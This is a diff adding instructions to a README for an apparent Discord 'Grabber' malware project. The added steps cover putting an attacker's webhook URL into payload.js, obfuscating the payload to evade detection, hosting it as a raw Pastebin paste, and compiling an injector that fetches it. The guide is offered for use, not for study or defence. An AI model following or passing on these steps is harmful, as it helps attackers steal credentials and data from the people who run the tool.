@@ -10,6 +10,28 @@
   <img src="https://steamuserimages-a.akamaihd.net/ugc/939465072079337699/A44A2D24BB987267F26C56440F51A0B468481222/">
 </p>
 
+# 🔖 Resource:
+  - [ObfuscatorIo](https://obfuscator.io)
+  - [Pastebin](https://pastebin.com)
+
+# 🎭 Payload obfuscation:
+  - You need to [Create discord webhook](https://serveur-prive.net/actualites/comment-creer-un-webhook-discord) and copy url
+  - Put you webhook url in `payload.js` (Replace *PUT YOUR WEBHOOK HERE* by *your url*) and save
+  - Go to [obfuscator.io](https://obfuscator.io) and put content of `payload.js` on website and click on *obfuscate* [**Like that**](https://media.discordapp.net/attachments/853366478873821197/855653528315232286/unknown.png)
+ 
+# 💻 Payload hosting: 
+  - Create new pastebin account; Click on `+ Paste` and put your obfuscated javascript code. Now 
+  - click on `Create New Past` [**Like that**](https://media.discordapp.net/attachments/853366478873821197/855654499053338654/unknown.png)
+  - Click on `Raw` to get raw url [**Like that**](https://media.discordapp.net/attachments/853366478873821197/855655158163046430/unknown.png) and copy it
+
+# 📦 Build Grabber:
+  - Go to `Injector/Injector/Program.cs` and replace `https://pastebin.com/raw/xxxxx` by your own pastebin raw url
+  - Build Grabber with visual studio or [**Like That**](https://qastack.fr/superuser/604953/how-can-i-compile-a-net-project-without-having-visual-studio-installed)
+
+#
+
+<img src="https://media.discordapp.net/attachments/850461540377034822/855630696709619752/SPOILER_unknown.png">
+
 #
 
 <p align="center"> 
